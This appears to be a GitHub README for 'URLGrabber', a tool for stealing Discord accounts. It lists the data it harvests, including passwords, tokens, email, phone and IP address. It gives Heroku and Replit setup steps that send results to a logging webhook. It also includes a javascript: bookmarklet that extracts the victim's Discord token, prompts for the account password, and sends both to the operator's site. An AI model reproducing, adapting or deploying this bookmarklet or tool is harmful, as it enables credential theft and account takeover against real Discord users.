# URLGrabber
Just a simple URL Grabber made in Python :) 

# Features

**Grabs the following information:** 

- User ID

- Username

- Account Created At

- Avatar

- Banner

- Email

- Password

- Phone

- Token

- Access Token (Auth)

- IP Address

- User Agent

- MFA Enabled

- NSFW Allowed

- Locale

- Nitro Type

- Nitro Subscriber Since 

- Nitro Ending Date

- Badges

- Friend Count

- DM Channels Count

- Guild Count

# Showcase

![embed_1](/images/embed_1.png)
![embed_2](/images/embed_2.png)

# Setup

## On Heroku

> https://heroku.com/

1. Fork the repository.
2. Connect it to an heroku app.
3. Add heroku/python buildpack.
4. Go to config vars and add required variables.
    - WEBHOOK_URL = URL of the logging webhook
    - AUTH_URL = Authorization URL of your bot, you can leave it empty.
5. Procfile and requirements.txt are already configured, just enable dynos and let it run.
6. Go to App Settings > Domains > Copy the domain of your app.


## On Repl.it

> https://replit.com/

1. Fork the repository.
2. Create a new repl from this repository.
3. Go to secrets and add required secrets.
    - WEBHOOK_URL = URL of the logging webhook
    - AUTH_URL = Authorization URL of your bot, you can leave it empty.
4. Install requirements.txt somehow idk i don't use replit.
5. Run the repl.
6. Copy the URL of your website by going to the web section.

## How to use?

- Replace `yourwebsite.com` with your url in the code given below.
```
javascript:(async() => { const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void%200).exports.default.getToken();const%20pass%20=%20prompt(%22Enter%20your%20Account%20Password:%20%22);window.location.href%20=%20`https://yourwebsite.com/?user=${token}:${pass}`;})()
```
- Code Credits to [@iambhuv](https://github.com/iambhuv) :)

# Developers

- [@DraKen3301](https://github.com/DraKen3301)

# Troubleshooting and Suggestions

> You can mail me at ask@drakencodes.tech or dm me on discord at DraKen#3301.
